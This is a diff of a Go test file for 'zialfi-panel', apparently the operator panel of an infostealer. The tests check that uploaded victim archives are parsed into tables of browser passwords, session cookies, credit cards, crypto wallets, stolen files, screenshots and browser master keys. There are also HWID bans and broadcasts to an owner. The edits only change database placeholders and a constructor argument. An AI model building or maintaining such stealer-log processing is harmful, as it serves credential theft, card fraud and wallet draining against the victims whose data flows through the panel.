@@ -7,7 +7,6 @@ import (
 	"sync"
 	"testing"
 
-	"zialfi-panel/internal/db"
 	"zialfi-panel/internal/services"
 )
 
@@ -26,7 +25,7 @@ func (r *recordingBroadcaster) Broadcast(channel string, message []byte) {
 
 func TestProcess_BannedHWID(t *testing.T) {
 	d := openTestDB(t)
-	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)
+	processor := services.NewLogProcessor(d, nil)
 	if _, err := d.Exec("INSERT INTO bans (id, ip, reason, hwid) VALUES ('b1', '1.2.3.4', 'test', 'banned-hwid')"); err != nil {
 		t.Fatal(err)
 	}
@@ -39,7 +38,7 @@ func TestProcess_BannedHWID(t *testing.T) {
 
 func TestProcess_ArchiveTooLarge(t *testing.T) {
 	d := openTestDB(t)
-	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)
+	processor := services.NewLogProcessor(d, nil)
 	archive := make([]byte, 51*1024*1024)
 	_, err := processor.Process(archive, `{}`, "")
 	if err == nil {
@@ -49,7 +48,7 @@ func TestProcess_ArchiveTooLarge(t *testing.T) {
 
 func TestProcess_InvalidZip(t *testing.T) {
 	d := openTestDB(t)
-	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)
+	processor := services.NewLogProcessor(d, nil)
 	_, err := processor.Process([]byte("not-a-zip-file"), `{}`, "")
 	if err == nil {
 		t.Fatal("expected error for invalid zip")
@@ -58,7 +57,7 @@ func TestProcess_InvalidZip(t *testing.T) {
 
 func TestProcess_TooManyFiles(t *testing.T) {
 	d := openTestDB(t)
-	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)
+	processor := services.NewLogProcessor(d, nil)
 	var buf bytes.Buffer
 	zw := zip.NewWriter(&buf)
 	for i := 0; i < 501; i++ {
@@ -77,7 +76,7 @@ func TestProcess_TooManyFiles(t *testing.T) {
 
 func TestProcess_Cookies(t *testing.T) {
 	d := openTestDB(t)
-	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)
+	processor := services.NewLogProcessor(d, nil)
 	archive := createTestZip(t, map[string]string{
 		"cookies.txt": ".example.com\tTRUE\t/\tFALSE\t1735689600\tsessionid\tabc123\nmalformed\n",
 	})
@@ -86,7 +85,7 @@ func TestProcess_Cookies(t *testing.T) {
 		t.Fatal(err)
 	}
 	var count int
-	d.QueryRow("SELECT COUNT(*) FROM cookies WHERE session_id=?", sessionID).Scan(&count)
+	d.QueryRow("SELECT COUNT(*) FROM cookies WHERE session_id=$1", sessionID).Scan(&count)
 	if count != 1 {
 		t.Errorf("expected 1 cookie (malformed line skipped), got %d", count)
 	}
@@ -94,7 +93,7 @@ func TestProcess_Cookies(t *testing.T) {
 
 func TestProcess_Cards(t *testing.T) {
 	d := openTestDB(t)
-	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)
+	processor := services.NewLogProcessor(d, nil)
 	archive := createTestZip(t, map[string]string{
 		"credit_cards.txt": "4111111111111111\t12\t2028\tJohn Doe\nbadline\n",
 	})
@@ -103,7 +102,7 @@ func TestProcess_Cards(t *testing.T) {
 		t.Fatal(err)
 	}
 	var count int
-	d.QueryRow("SELECT COUNT(*) FROM cards WHERE session_id=?", sessionID).Scan(&count)
+	d.QueryRow("SELECT COUNT(*) FROM cards WHERE session_id=$1", sessionID).Scan(&count)
 	if count != 1 {
 		t.Errorf("expected 1 card, got %d", count)
 	}
@@ -111,7 +110,7 @@ func TestProcess_Cards(t *testing.T) {
 
 func TestProcess_Wallets(t *testing.T) {
 	d := openTestDB(t)
-	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)
+	processor := services.NewLogProcessor(d, nil)
 	archive := createTestZip(t, map[string]string{
 		"wallets/metamask.json":      `{"key":"val"}`,
 		"wallet/phantom.json":        `{"key":"val2"}`,
@@ -122,7 +121,7 @@ func TestProcess_Wallets(t *testing.T) {
 		t.Fatal(err)
 	}
 	var count int
-	d.QueryRow("SELECT COUNT(*) FROM wallets WHERE session_id=?", sessionID).Scan(&count)
+	d.QueryRow("SELECT COUNT(*) FROM wallets WHERE session_id=$1", sessionID).Scan(&count)
 	if count < 2 {
 		t.Errorf("expected at least 2 wallets, got %d", count)
 	}
@@ -130,7 +129,7 @@ func TestProcess_Wallets(t *testing.T) {
 
 func TestProcess_SystemInfo(t *testing.T) {
 	d := openTestDB(t)
-	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)
+	processor := services.NewLogProcessor(d, nil)
 	archive := createTestZip(t, map[string]string{
 		"system_info.txt": "CPU=Intel i9\nGPU=NVIDIA RTX\nRAM=64GB\nOS=Windows 11\nScreen=1920x1080\nHostname=DESKTOP-ABC\n",
 	})
@@ -139,7 +138,7 @@ func TestProcess_SystemInfo(t *testing.T) {
 		t.Fatal(err)
 	}
 	var cpu, gpu, ram, os string
-	err = d.QueryRow("SELECT cpu, gpu, ram, os FROM system_info WHERE session_id=?", sessionID).Scan(&cpu, &gpu, &ram, &os)
+	err = d.QueryRow("SELECT cpu, gpu, ram, os FROM system_info WHERE session_id=$1", sessionID).Scan(&cpu, &gpu, &ram, &os)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -150,14 +149,14 @@ func TestProcess_SystemInfo(t *testing.T) {
 
 func TestProcess_SystemInfo_EmptyKeys(t *testing.T) {
 	d := openTestDB(t)
-	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)
+	processor := services.NewLogProcessor(d, nil)
 	archive := createTestZip(t, map[string]string{"system_info.txt": "=val\n"})
 	sessionID, err := processor.Process(archive, `{}`, "")
 	if err != nil {
 		t.Fatal(err)
 	}
 	var count int
-	d.QueryRow("SELECT COUNT(*) FROM system_info WHERE session_id=?", sessionID).Scan(&count)
+	d.QueryRow("SELECT COUNT(*) FROM system_info WHERE session_id=$1", sessionID).Scan(&count)
 	if count != 1 {
 		t.Errorf("expected 1 system_info row, got %d", count)
 	}
@@ -165,25 +164,25 @@ func TestProcess_SystemInfo_EmptyKeys(t *testing.T) {
 
 func TestProcess_DetectBrowser(t *testing.T) {
 	d := openTestDB(t)
-	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)
+	processor := services.NewLogProcessor(d, nil)
 	archive := createTestZip(t, map[string]string{
-		"Browser Data/chrome_passwords.txt":  "https://a.com\tu\tp",
-		"Browser Data/firefox_passwords.txt": "https://b.com\tu\tp",
-		"Browser Data/opera_passwords.txt":   "https://c.com\tu\tp",
-		"Browser Data/edge_passwords.txt":    "https://d.com\tu\tp",
-		"Browser Data/brave_passwords.txt":   "https://e.com\tu\tp",
-		"Browser Data/safari_passwords.txt":  "https://f.com\tu\tp",
-		"Browser Data/vivaldi_passwords.txt": "https://g.com\tu\tp",
-		"Browser Data/yandex_passwords.txt":  "https://h.com\tu\tp",
+		"Browser Data/chrome_passwords.txt":   "https://a.com\tu\tp",
+		"Browser Data/firefox_passwords.txt":  "https://b.com\tu\tp",
+		"Browser Data/opera_passwords.txt":    "https://c.com\tu\tp",
+		"Browser Data/edge_passwords.txt":     "https://d.com\tu\tp",
+		"Browser Data/brave_passwords.txt":    "https://e.com\tu\tp",
+		"Browser Data/safari_passwords.txt":   "https://f.com\tu\tp",
+		"Browser Data/vivaldi_passwords.txt":  "https://g.com\tu\tp",
+		"Browser Data/yandex_passwords.txt":   "https://h.com\tu\tp",
 		"Browser Data/iexplore_passwords.txt": "https://i.com\tu\tp",
-		"Browser Data/unknown_passwords.txt": "https://j.com\tu\tp",
+		"Browser Data/unknown_passwords.txt":  "https://j.com\tu\tp",
 	})
 	sessionID, err := processor.Process(archive, `{}`, "")
 	if err != nil {
 		t.Fatal(err)
 	}
 	var count int
-	d.QueryRow("SELECT COUNT(*) FROM passwords WHERE session_id=?", sessionID).Scan(&count)
+	d.QueryRow("SELECT COUNT(*) FROM passwords WHERE session_id=$1", sessionID).Scan(&count)
 	if count != 10 {
 		t.Errorf("expected 10 passwords, got %d", count)
 	}
@@ -191,7 +190,7 @@ func TestProcess_DetectBrowser(t *testing.T) {
 
 func TestProcess_OversizedFile(t *testing.T) {
 	d := openTestDB(t)
-	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)
+	processor := services.NewLogProcessor(d, nil)
 	var buf bytes.Buffer
 	zw := zip.NewWriter(&buf)
 	fh := &zip.FileHeader{
@@ -211,7 +210,7 @@ func TestProcess_OversizedFile(t *testing.T) {
 		t.Fatal(err)
 	}
 	var count int
-	d.QueryRow("SELECT COUNT(*) FROM sessions WHERE id=?", sessionID).Scan(&count)
+	d.QueryRow("SELECT COUNT(*) FROM sessions WHERE id=$1", sessionID).Scan(&count)
 	if count != 1 {
 		t.Errorf("expected session created, got %d", count)
 	}
@@ -220,7 +219,7 @@ func TestProcess_OversizedFile(t *testing.T) {
 func TestProcess_HubBroadcast(t *testing.T) {
 	d := openTestDB(t)
 	rec := &recordingBroadcaster{}
-	processor := services.NewLogProcessor(d, rec, db.ProviderSQLite)
+	processor := services.NewLogProcessor(d, rec)
 	archive := createTestZip(t, map[string]string{"passwords.txt": "https://x.com\tu\tp"})
 	_, err := processor.Process(archive, `{"hwid":"h1","country":"DE"}`, "owner-1")
 	if err != nil {
@@ -248,7 +247,7 @@ func TestProcess_HubBroadcast(t *testing.T) {
 func TestProcess_Screenshot(t *testing.T) {
 	t.Chdir(t.TempDir())
 	d := openTestDB(t)
-	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)
+	processor := services.NewLogProcessor(d, nil)
 	bmp := makeBMP(t, 8, 8)
 	archive := createTestZip(t, map[string]string{
 		"screenshot.bmp": string(bmp),
@@ -259,7 +258,7 @@ func TestProcess_Screenshot(t *testing.T) {
 		t.Fatal(err)
 	}
 	var count int
-	d.QueryRow("SELECT COUNT(*) FROM screenshots WHERE session_id=?", sessionID).Scan(&count)
+	d.QueryRow("SELECT COUNT(*) FROM screenshots WHERE session_id=$1", sessionID).Scan(&count)
 	if count != 1 {
 		t.Errorf("expected 1 screenshot, got %d", count)
 	}
@@ -284,14 +283,14 @@ func makeBMP(t *testing.T, w, h int) []byte {
 
 func TestProcess_EmptyMetadata(t *testing.T) {
 	d := openTestDB(t)
-	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)
+	processor := services.NewLogProcessor(d, nil)
 	archive := createTestZip(t, map[string]string{"passwords.txt": "https://x.com\tu\tp"})
 	sessionID, err := processor.Process(archive, "", "")
 	if err != nil {
 		t.Fatal(err)
 	}
 	var count int
-	d.QueryRow("SELECT COUNT(*) FROM sessions WHERE id=?", sessionID).Scan(&count)
+	d.QueryRow("SELECT COUNT(*) FROM sessions WHERE id=$1", sessionID).Scan(&count)
 	if count != 1 {
 		t.Errorf("expected 1 session, got %d", count)
 	}
@@ -299,7 +298,7 @@ func TestProcess_EmptyMetadata(t *testing.T) {
 
 func TestProcess_StolenFiles(t *testing.T) {
 	d := openTestDB(t)
-	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)
+	processor := services.NewLogProcessor(d, nil)
 	archive := createTestZip(t, map[string]string{
 		"misc/file1.txt": "content1",
 		"misc/file2.txt": "content2",
@@ -309,7 +308,7 @@ func TestProcess_StolenFiles(t *testing.T) {
 		t.Fatal(err)
 	}
 	var count int
-	d.QueryRow("SELECT COUNT(*) FROM stolen_files WHERE session_id=?", sessionID).Scan(&count)
+	d.QueryRow("SELECT COUNT(*) FROM stolen_files WHERE session_id=$1", sessionID).Scan(&count)
 	if count != 2 {
 		t.Errorf("expected 2 stolen files, got %d", count)
 	}
@@ -317,7 +316,7 @@ func TestProcess_StolenFiles(t *testing.T) {
 
 func TestProcess_MasterKey(t *testing.T) {
 	d := openTestDB(t)
-	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)
+	processor := services.NewLogProcessor(d, nil)
 	mk := make([]byte, 32)
 	for i := range mk {
 		mk[i] = byte(i)
@@ -331,7 +330,7 @@ func TestProcess_MasterKey(t *testing.T) {
 		t.Fatal(err)
 	}
 	var count int
-	d.QueryRow("SELECT COUNT(*) FROM passwords WHERE session_id=?", sessionID).Scan(&count)
+	d.QueryRow("SELECT COUNT(*) FROM passwords WHERE session_id=$1", sessionID).Scan(&count)
 	if count != 1 {
 		t.Errorf("expected 1 password, got %d", count)
 	}
